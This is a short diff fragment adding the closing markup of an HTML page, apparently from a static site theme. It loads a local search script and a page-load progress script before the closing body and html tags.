+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+
+
+
+
+
+</body>
+</html>
